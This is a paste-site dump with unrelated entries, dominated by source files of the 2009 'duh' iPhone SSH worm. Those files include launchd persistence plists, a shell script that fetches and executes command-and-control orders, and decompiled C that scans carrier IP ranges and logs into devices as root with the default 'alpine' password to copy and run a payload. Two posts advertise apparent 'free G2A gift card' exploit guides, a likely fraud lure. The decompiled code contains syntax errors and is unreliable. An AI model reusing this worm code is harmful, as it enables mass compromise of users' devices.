id,title,username,language,date,content
hhz6aLwj,Untitled,Cartes010,GetText,Monday 25th of March 2024 12:55:54 AM CDT,"Cheat Expired,Silahkan download yang terbaru."
7kFv7WkD,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 25th of March 2024 12:24:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_607742.pdf

Working as of:
25 March 2024


















"
CqEN3QRB,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 25th of March 2024 12:18:59 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
25 March 2024















































"
VQBefdSZ,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Monday 25th of March 2024 12:04:04 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 46, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 228, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 64, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1194, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 578, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
WWhMQJpe,worm/scripts/com.apple.ksyslog.plist,FlyFar,XML,Sunday 24th of March 2024 11:48:31 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.ksyslog</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/sshd</string>
            </array>
            <key>RunAtLoad</key>
				<true/>
			<key>KeepAlive</key>
				<true/>
		</dict>
</plist>"
yRfTjxpk,worm/scripts/com.apple.period.plist,FlyFar,XML,Sunday 24th of March 2024 11:47:53 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.period-aily</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/syslog</string>
            </array>
             <key>StartInterval</key>
				<integer>300</integer>
		</dict>
</plist>"
qxr7D3tp,worm/scripts/syslog,FlyFar,Bash,Sunday 24th of March 2024 11:46:05 PM CDT,"#!/bin/sh
cd /private/var/mobile/home/
ID=$(cat /etc/rel)  # Get bot client ID
PATH=.:$PATH
# invoke ""duh"" application - which checks in to C&C server with bot client ID
# The C&C server replies are stored in file .tmp, which is then interrogated for new commands
# via the check function
/private/var/mobile/home/duh SERVER /xml/p.php?id=$ID > /private/var/mobile/home/.tmp
check;

function check {
    if test 2 -lt $(wc -l .tmp | cut -d "" "" -f 1)
    then
	sh /private/var/mobile/home/.tmp
    fi
}"
a08WPnsP,worm/duh.c,FlyFar,C,Sunday 24th of March 2024 11:45:24 PM CDT,"#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>

int create_tcp_socket();
char *get_ip(char *host);
char *build_get_query(char *host, char *page);
void usage();

#define HOST ""127.0.0.1""
#define PAGE ""/""
#define PORT 80
#define USERAGENT ""HTMLGET 1.0""

int main(int argc, char **argv)
{
  struct sockaddr_in *remote;
  int sock;
  int tmpres;
  char *ip;
  char *get;
  char buf[BUFSIZ+1];
  char *host;
  char *page;

  host = argv[1];
  if(argc > 2){
    page = argv[2];
  }else{
    page = PAGE;
  }
  sock = create_tcp_socket();
  ip = get_ip(host);
  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  remote->sin_family = AF_INET;
  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  if( tmpres < 0)  
  {
    perror(""Can't set remote->sin_addr.s_addr"");
    exit(1);
  }else if(tmpres == 0)
  {
    fprintf(stderr, ""%s is not a valid IP address\n"", ip);
    exit(1);
  }
  remote->sin_port = htons(PORT);

  if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    perror(""Could not connect"");
    exit(1);
  }
  get = build_get_query(host, page);
  
  
  int sent = 0;
  while(sent < strlen(get))
  { 
    tmpres = send(sock, get+sent, strlen(get)-sent, 0);
    if(tmpres == -1){
      perror(""Can't send query"");
      exit(1);
    }
    sent += tmpres;
  }
                   
  memset(buf, 0, sizeof(buf));
  int htmlstart = 0;
  char * htmlcontent;
  while((tmpres = recv(sock, buf, BUFSIZ, 0)) > 0){
    if(htmlstart == 0)
    {
      htmlcontent = strstr(buf, ""\r\n\r\n"");
      if(htmlcontent != NULL){
        htmlstart = 1;
        htmlcontent += 4;
      }
    }else{
      htmlcontent = buf;
    }
    if(htmlstart){
      fprintf(stdout, htmlcontent);
    }
 
    memset(buf, 0, tmpres);
  }
  if(tmpres < 0)
  {
    perror(""Error receiving data"");
  }
  free(get);
  free(remote);
  free(ip);
  close(sock);
  return 0;
}

int create_tcp_socket()
{
  int sock;
  if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
    perror(""Can't create TCP socket"");
    exit(1);
  }
  return sock;
}


char *get_ip(char *host)
{
  struct hostent *hent;
  int iplen = 15;
  char *ip = (char *)malloc(iplen+1);
  memset(ip, 0, iplen+1);
  if((hent = gethostbyname(host)) == NULL)
  {
    herror(""Can't get IP"");
    exit(1);
  }
  if(inet_ntop(AF_INET, (void *)hent->h_addr_list[0], ip, iplen) == NULL)
  {
    perror(""Can't resolve host"");
    exit(1);
  }
  return ip;
}

char *build_get_query(char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = ""GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n"";
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  }
  
  query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5);
  sprintf(query, tpl, getpage, host, USERAGENT);
  return query;
}"
PXBY8pmU,worm/sshd.c,FlyFar,C,Sunday 24th of March 2024 11:43:05 PM CDT,"/* 
   This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2015 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
   
   /// NOTE ///
   As you can see, the 'duh' worm of 2009 is just another
   iKee variant, the decompiled code is VERY much the exact same
   except that debug messages were mostly removed, and the infection
   routine was modified...
   /// END ///
*/

#include ""sshd.h""

int fdlock;

//----- (00001984) --------------------------------------------------------
char *randHost() // Generates a random SubNet to scan...
{
  char *retme;
  int x = random() % 255;
  int y = random() % 255;
  int z = random() % 255;

  srand(time(0));
  asprintf(&retme, ""%i.%i.%i."", x, y, z);
  return retme;
}

//----- (00001A80) --------------------------------------------------------
int get_lock(void) // Sets/Gets the status of the file lock located in /var/lock/ssh.lock
{
    struct flock fl;
    fl.l_type = F_WRLCK;
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;
    fl.l_len = 1;
    if((fdlock = open(""/var/lock/ssh.lock"", O_WRONLY|O_CREAT, 0666)) == -1)
      return 0;
    if(fcntl(fdlock, F_SETLK, &fl) == -1)
      return 0;
    return 1;
}

//----- (00001B70) --------------------------------------------------------
char *getAddrRange()
{
  struct ifaddrs, *ifaddr, *ifa;
  int family, s;
  char host[NI_MAXHOST];]

  if (getifaddrs(&ifaddr) == -1) {
    perror(""getifaddrs"");
    exit(EXIT_FAILURE);
  }
  for (ifa = ifaddr; ifa != NULL; i = ifa->ifa_next) {
    family = ifa->ifa_addr->sa_family;
    if (family == AF_INET || family == AF_INET6)
    {
      s = getnameinfo(ifa->ifa_addr,(family == AF_INET) ? sizeof(struct sockaddr_in): sizeof(struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
      if (s != 0) {
        printf(""getnameinfo() failed: %s\n"", gai_strerror(s));
        return ""0.0.0.0-0.0.0.0"";
      }
      if (!strcmp(ifa->ifa_name, ""pdp_ip0"")) {
      	char *wee[20];
        tokenise(host, wee, ""."");
        int octc = atoi(wee[2]);
        asprintf((char*)&range, ""%s.%s.%i.0-%s.%s.%i.255"", wee[0], wee[1], octc, wee[0], wee[1], octc+2);
        return (char*)range;
      }
    }
  }
  freeifaddrs(ifaddr);
  return ""0.0.0.0-0.0.0.0"";
}

//----- (00001DB4) --------------------------------------------------------
int tokenise(char *input[], char *token[], char *spl)
{
  char *tokens;
  int count = 0;
  
  tokens = strtok(input, spl);
  
  if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
  token[count] = tokens;
  while(tokens != NULL) {
  	count++;
  	if(count > 4096) return (-1);
  	tokens = strtok(NULL, spl);
  	if(tokens != NULL) {
  		if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
	  }
	token[count] = tokens;
  }
  return count;
}

//----- (00001F1C) --------------------------------------------------------
int main() {
  if (get_lock()) {
    sleep(60);
    char *ipRanges[] = { getAddrRange(), 				// Local Net
    					 ""94.157.100.0-94.157.255.255"", // T-mobile, Netherlands
    					 ""87.103.52.255-87.103.66.255"", // Vodafone, Portugal
    					 ""94.157.0.0.0-120.157.99.255"", // T-mobile, Netherlands
    					 ""114.72.0.0-114.75.255.255"", 	// OPTUSINTERNET, Australia
    					 ""92.248.90.0-92.248.120.255"",	// MOBILKOM, Austria
    					 ""81.217.74.0-81.217.74.255"",	// Kabelsignal AG, Austria
    					 ""84.224.60.0-84.224.80.255"",	// Pannon GSM Telecommunications Inc, Hungary
    					 ""188.88.100.0-188.88.160.255"",	// T-mobile, Netherlands
    					 ""77.248.140.0-77.248.146.255"",	// UPC broadband, Austria
    					 ""77.54.160.0-77.54.190.255"",	// Vodafone, Portugal
    					 ""80.57.116.0-80.57.131.255"",	// UPC broadband, Austria
    					 ""84.224.0.0-84.224.63.255"" };	// Pannon GSM Telecommunications Inc, Hungary
    while(1) {
      for(int j = 0; j < sizeof(ipRanges); ++j) {
      	scanner(ipRanges[j]);
      	for (int k = 0; k <= 2; ++k) {
          randSubNet = randHost();
          char *zeRange;
          asprintf(&zeRange, ""%s.0-%s.255"", randSubNet, randSubNet);
          scanner(zeRange);
      }
    }
  }
  return 1;
}

//----- (00002110) --------------------------------------------------------
void scanner(char *ipRange)
{
    char *wee[10];
    char *begin[10];
    char *end[10];
    tokenise(ipRange, wee, ""-"");
    int octaB, octaE, octbB, octbE, octcB, octcE;
    tokenise(wee[0], begin, ""."");
    tokenise(wee[1], end, ""."");
    octaB = atoi(begin[0]);
    octaE = atoi(end[0]);
    octbB = atoi(begin[1]);
    octbE = atoi(end[1]);
    octcB = atoi(begin[2]);
    octcE = atoi(end[2]);
    
    for (int loop1=octaB; loop1<=octaE; loop1++)
    {
        for (int loop2=octbB; loop2<=octbE; loop2++)
        {
            for (int loop3=octcB; loop3<=octcE; loop3++)
            {
                for (int loop4=0; loop4<=255; loop4++)
                {
                    char* host;
                    asprintf(&host, ""%i.%i.%i.%i"", loop1, loop2, loop3, loop4);
                    if (!scanHost(host) && !checkHost(host))
                    {
                        initfst(host);
                    }
                }
            }
        }
    }
}

//----- (00002314) --------------------------------------------------------
int scanHost(char* host)
{
    int res, valopt, soc;
    struct sockaddr_in addr;
    long arg;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    soc = socket(AF_INET, SOCK_STREAM, 0);
    arg = fcntl(soc, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(soc, F_SETFL, arg);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    addr.sin_addr.s_addr = inet_addr(host);
    res = connect(soc, (struct sockaddr *)&addr, sizeof(addr));
    if (res < 0) {
      if (errno == EINPROGRESS) {
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(soc, &myset);
        if (select(soc+1, NULL, &myset, NULL, &tv) > 0) {
            lon = sizeof(int);
            getsockopt(soc, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if (valopt) {
              return -1;
            }
        }
        else {
            return -1; }
      }
      else { return -1; }
    }
    close(soc);
    return 0;
}

//----- (000024E0) --------------------------------------------------------
int checkHost(char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    syslog(LOG_DEBUG, ""%s"", host); // One of the few times he decides to call a SYSLOG.
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'echo 99'"", VULN_PASS, host);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99""))
            	return 0;
    	}
    }
    pclose(in);
    return -1; // NOT VULN
}

//----- (000025DC) --------------------------------------------------------
int runCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s ; echo 99'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99"")) return 0;
    	}
    }
    pclose(in);
    return -1;
}

//----- (000026D8) --------------------------------------------------------
int prunCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {
        	printf(""%s"", buff);
    	}
    }
    pclose(in);
    return -1;
}

//----- (000027BC) --------------------------------------------------------
int CopyFile(char* src, char* dst, char* host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s scp -o StrictHostKeyChecking=no ./%s root@%s:%s"", VULN_PASS, src, host, dst);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {}
    	asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'which %s'"", VULN_PASS, host, dst);
    	if (in = popen(execLine, ""r"")) {
    		while (fgets(buff, 2, in) != NULL ) {
        		if (strcmp(buff, dst))
            		return 0;
    		}
    		return -1;
    	}
    	return -1;
    }
    pclose(in);
    return -1;
}

//----- (0000294C) --------------------------------------------------------
int initfst(char *host) {
  if (!runCommand(""mkdir /private/var/mobile/home"", host))
  {
    if (!CopyFile(""/private/var/mobile/home/cydia.tgz"", ""/private/var/mobile/home/cydia.tgz"", host))
    	prunCommand(""cd /private/var/mobile/home/;tar xzf cydia.tgz;./inst"", host);
  }
  return 0;
}"
k9TUqb9G,worm/sshd.h,FlyFar,C,Sunday 24th of March 2024 11:37:54 PM CDT,"#include <sys/fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <syslog.h>
#include <errno.h>
#include <ifaddrs.h>
#include <string.h>

#define VULN_PASS ""alpine""

void scanner(char *ipRange);
int scanHost(char* host);
int checkHost(char *host);
int runCommand(char* command, char *host);
int prunCommand(char* command, char *host);
int CopyFile(char* src, char* dst, char* host);
int infectHost(char *host);
char *randHost(void);
int get_lock(void);
char *getAddrRange();
int tokenise (char input[], char *token[], char* spl);"
